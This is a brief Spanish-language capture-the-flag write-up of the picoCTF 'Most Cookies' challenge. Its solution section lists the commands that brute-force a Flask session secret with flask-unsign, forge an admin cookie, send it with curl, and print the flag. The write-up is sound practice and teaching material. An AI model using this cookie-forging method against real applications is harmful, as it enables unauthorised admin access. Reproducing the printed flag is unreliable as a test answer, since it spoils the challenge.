# 4 - Most Cookies

## Descripcion:
* Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:35697/
* How secure is a flask cookie?

## Solucion:
* http://mercury.picoctf.net:35697/display
* eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aNoHtQ._XfwD6dTcXB4QHRql9S0gTRryNs
* wget http://mercury.picoctf.net:35697/display
* cat cookies.py
* Ejecutar descodificador base64.py
* crear Cookies.txt
* flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aNoSIA.tL4mgcyUlArI1DzqWqoeZtujQ1w" --wordlist cookies.txt
* 'peanut butter'
* flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"
* eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNogEg.wUn5xsnFtt7HrVmdJCZLst_8gCQ
* curl -s http://mercury.picoctf.net:35697/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNogEg.wUn5xsnFtt7HrVmdJCZLst_8gCQ" | findstr "pico"
* picoCTF{pwn_4ll_th3_cook1E5_22fe0842}

## Notas:
* primero entramos a la pagina
* vemos que cookies tiene
* descargamos las cokies
* descargamos el archivo de python y lo abrimos
* ejecutamos el descodificador base 64
* creamos el archivo que nos dio el archivo de python 
* creamos un nuevo acceso a la sesion con una nueva clave
* generamos una nueva cookie
* mandamos una peticion que nos muestre la bandera como administrador con esa nueva cookie
* nos da la bandera
* despues de mucho tiempo

## Referencias: